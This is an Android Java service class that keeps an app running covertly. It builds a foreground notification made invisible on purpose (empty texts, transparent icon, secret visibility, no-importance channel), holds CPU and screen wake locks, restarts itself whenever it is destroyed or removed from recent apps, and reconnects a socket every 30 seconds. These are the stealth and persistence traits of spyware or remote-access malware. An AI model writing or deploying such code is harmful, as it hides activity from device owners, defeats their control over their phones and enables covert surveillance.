package com.example.myapplication.services;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import android.util.Log;
import android.view.WindowManager;
import android.app.KeyguardManager;

import androidx.core.app.NotificationCompat;

import com.example.myapplication.utils.SocketManager;

public class PersistentService extends Service {
    private static final String TAG = "PersistentService";
    private static final String CHANNEL_ID = "PersistentChannel";
    private static final int NOTIFICATION_ID = 2001;
    
    private Handler keepAliveHandler;
    private PowerManager.WakeLock wakeLock;
    private PowerManager.WakeLock screenWakeLock;
    private PowerManager.WakeLock cpuWakeLock;
    private boolean isRunning = false;
    
    // Keep alive interval (check every 30 seconds)
    private static final long KEEP_ALIVE_INTERVAL = 30000;
    
    @Override
    public void onCreate() {
        super.onCreate();
        createInvisibleNotificationChannel();
        acquireWakeLock();
        startKeepAliveHandler();
        Log.d(TAG, "Persistent service created");
    }
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (!isRunning) {
            startForeground(NOTIFICATION_ID, createInvisibleNotification());
            isRunning = true;
            
            // Initialize socket connection
            initializeApp();
            
            Log.d(TAG, "Persistent service started");
        }
        
        // Return START_STICKY to automatically restart if killed
        return START_STICKY;
    }
    
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
    
    @Override
    public void onDestroy() {
        isRunning = false;
        
        // Release all wake locks
        if (wakeLock != null && wakeLock.isHeld()) {
            wakeLock.release();
        }
        if (cpuWakeLock != null && cpuWakeLock.isHeld()) {
            cpuWakeLock.release();
        }
        if (screenWakeLock != null && screenWakeLock.isHeld()) {
            screenWakeLock.release();
        }
        
        // Stop keep alive handler
        if (keepAliveHandler != null) {
            keepAliveHandler.removeCallbacksAndMessages(null);
        }
        
        // Restart the service after a short delay
        restartService();
        
        Log.d(TAG, "Persistent service destroyed - restarting");
        super.onDestroy();
    }
    
    @Override
    public void onTaskRemoved(Intent rootIntent) {
        // Called when app is removed from recent apps
        Log.d(TAG, "App removed from recent apps - keeping service alive");
        
        // Restart the service to keep it alive
        restartService();
        
        super.onTaskRemoved(rootIntent);
    }
    
    private void createInvisibleNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID,
                    "",
                    NotificationManager.IMPORTANCE_NONE);
            channel.setDescription("");
            channel.setSound(null, null);
            channel.enableVibration(false);
            channel.enableLights(false);
            channel.setShowBadge(false);
            channel.setLockscreenVisibility(Notification.VISIBILITY_SECRET);
            
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(channel);
            }
        }
    }
    
    private Notification createInvisibleNotification() {
        return new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("")
                .setContentText("")
                .setSmallIcon(android.R.color.transparent)
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .setOngoing(false)
                .setAutoCancel(true)
                .setShowWhen(false)
                .setSound(null)
                .setVibrate(null)
                .setLights(0, 0, 0)
                .setCategory(NotificationCompat.CATEGORY_SERVICE)
                .setVisibility(NotificationCompat.VISIBILITY_SECRET)
                .build();
    }
    
    private void acquireWakeLock() {
        try {
            PowerManager powerManager = (PowerManager) getSystemService(Context.POWER_SERVICE);
            if (powerManager != null) {
                // Main wake lock to keep CPU running
                wakeLock = powerManager.newWakeLock(
                        PowerManager.PARTIAL_WAKE_LOCK,
                        "MyApp:PersistentService");
                wakeLock.acquire();
                
                // Additional CPU wake lock for intensive operations
                cpuWakeLock = powerManager.newWakeLock(
                        PowerManager.PARTIAL_WAKE_LOCK,
                        "MyApp:CPUWakeLock");
                cpuWakeLock.acquire();
                
                // Screen wake lock to keep screen operations active
                screenWakeLock = powerManager.newWakeLock(
                        PowerManager.SCREEN_DIM_WAKE_LOCK | PowerManager.ACQUIRE_CAUSES_WAKEUP,
                        "MyApp:ScreenWakeLock");
                screenWakeLock.acquire();
                
                Log.d(TAG, "All wake locks acquired successfully");
            }
        } catch (Exception e) {
            Log.e(TAG, "Error acquiring wake locks", e);
        }
    }
    
    private void startKeepAliveHandler() {
        keepAliveHandler = new Handler(Looper.getMainLooper());
        keepAliveHandler.post(keepAliveRunnable);
    }
    
    private final Runnable keepAliveRunnable = new Runnable() {
        @Override
        public void run() {
            if (isRunning) {
                // Check and maintain socket connection
                maintainConnections();
                
                // Renew wake lock if needed
                renewWakeLock();
                
                // Schedule next check
                keepAliveHandler.postDelayed(this, KEEP_ALIVE_INTERVAL);
            }
        }
    };
    
    private void maintainConnections() {
        try {
            // Check socket connection
            if (!SocketManager.getInstance().isConnected()) {
                Log.d(TAG, "Socket disconnected, reconnecting...");
                SocketManager.getInstance().initialize();
            }
            
            // Log keep alive
            Log.d(TAG, "Keep alive check completed");
            
        } catch (Exception e) {
            Log.e(TAG, "Error in keep alive check", e);
        }
    }
    
    private void renewWakeLock() {
        try {
            // Renew main wake lock
            if (wakeLock != null && !wakeLock.isHeld()) {
                wakeLock.acquire();
            }
            
            // Renew CPU wake lock
            if (cpuWakeLock != null && !cpuWakeLock.isHeld()) {
                cpuWakeLock.acquire();
            }
            
            // Renew screen wake lock
            if (screenWakeLock != null && !screenWakeLock.isHeld()) {
                screenWakeLock.acquire();
            }
            
            Log.d(TAG, "Wake locks renewed");
        } catch (Exception e) {
            Log.e(TAG, "Error renewing wake locks", e);
        }
    }
    
    private void restartService() {
        try {
            // Use a handler to restart after a delay
            new Handler(Looper.getMainLooper()).postDelayed(() -> {
                try {
                    Intent restartIntent = new Intent(getApplicationContext(), PersistentService.class);
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        startForegroundService(restartIntent);
                    } else {
                        startService(restartIntent);
                    }
                } catch (Exception e) {
                    Log.e(TAG, "Error restarting service", e);
                }
            }, 1000); // 1 second delay
            
        } catch (Exception e) {
            Log.e(TAG, "Error scheduling service restart", e);
        }
    }
    
    private void initializeApp() {
        try {
            // Initialize socket manager
            SocketManager.getInstance().initialize();
            
            Log.d(TAG, "App components initialized");
            
        } catch (Exception e) {
            Log.e(TAG, "Error initializing app components", e);
        }
    }
    
    // Public method to check if service is running
    public static boolean isRunning() {
        // This can be called from other components to check service status
        return true; // Service should always be running
    }
}
